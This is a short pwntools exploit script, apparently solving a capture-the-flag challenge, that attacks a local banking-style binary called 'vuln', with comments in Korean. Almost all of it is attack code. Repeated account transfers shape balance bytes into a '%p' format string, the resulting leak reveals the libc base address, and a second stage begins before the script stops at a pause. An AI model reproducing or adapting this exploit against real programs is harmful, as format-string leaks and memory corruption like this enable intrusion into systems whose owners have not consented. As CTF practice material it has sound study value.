from pwn import *
from tqdm import tqdm
sla = lambda x,y : p.sendlineafter(x,y)
sa = lambda x,y : p.sendafter(x,y)
p = process('./vuln')
libc = ELF('./libc.so.6')

for i in tqdm(range(134)):
    sla(b'>',b'1')
    sla(b'Name',b'A'*(0x4c-8-1)) # 76-8-1 = 65 이름 65길이에 A로 생성

def transfer(fr,to,amount):
    assert amount >0
    sla(b'>',b'3')
    sla(b'from',str(fr))
    sla(b'to',str(to))
    sla(b'transfer? ',str(amount))
    
for i in tqdm(range(0x34)):
    transfer(128,0,35)
pause()
transfer(128,0,30)

for i in tqdm(range(0x34)):
    transfer(129,0,35)
transfer(129,0,30)

for i in tqdm(range(123)): # 123번 더해준다.
    transfer(i,130,35)
context.log_level='debug'
transfer(130,0,11) # 11을 빼줌으로서 %p형식을 만들어준다.

p.recvuntil(b'0x')
libc_base = int(b'0x'+p.recvuntil(b'_')[:-1],16) - libc.sym.write-20
success(hex(libc_base))
context.log_level='debug'
sla(b'>',b'1')
payload = b'A' * 8
sla(b'Name', payload)
sla(b'>', b'5')
sla(b'? ', b'123')
sla(b': ', b'asdf')
pause()